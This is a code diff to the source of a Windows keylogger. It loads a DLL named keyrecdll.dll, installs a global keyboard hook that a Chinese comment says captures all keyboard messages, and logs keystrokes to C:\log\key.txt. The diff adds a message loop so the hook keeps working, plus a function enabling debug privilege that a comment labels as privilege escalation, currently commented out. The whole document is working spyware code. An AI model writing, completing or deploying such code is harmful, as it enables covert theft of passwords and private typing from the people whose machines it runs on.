@@ -16,6 +16,34 @@
 
 HANDLE hDesProcess = NULL;
 
+bool AdjustProcessTokenPrivilege() {
+    LUID luidTmp;
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tkp;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        OutputDebugString("AdjustProcessTokenPrivilege OpenProcessToken Failed ! \n");
+        return false;
+    }
+
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidTmp)) {
+        OutputDebugString("AdjustProcessTokenPrivilege LookupPrivilegeValue Failed ! \n");
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Luid = luidTmp;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
+        OutputDebugString("AdjustProcessTokenPrivilege AdjustTokenPrivileges Failed ! \n");
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    return true;
+}
+
 DWORD FindProcess(LPCTSTR ProcessName){
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     DWORD dwThreadId = 0;
@@ -186,6 +214,9 @@ int main(){
         return 1;
     }
     
+    //提权
+    //AdjustProcessTokenPrivilege();
+
     //读取DLL及其中的函数
     HMODULE hMod = LoadLibraryA("keyrecdll.dll");
     if(!hMod){
@@ -215,9 +246,15 @@ int main(){
     hMod,
     0);//此处输入线程标识符，若为0则捕获全局键盘消息
     
-    printf("Hook Sueecss!\n Output: C:\\key.txt");
-    
+    printf("Hook Sueecss!\n Output: C:\\log\\key.txt");
+    MSG msg;
     while(1){
+        if (PeekMessageA(&msg, 0, 0, 0, PM_REMOVE)){
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+        else
+            Sleep(0);
     }
     
     return 0;
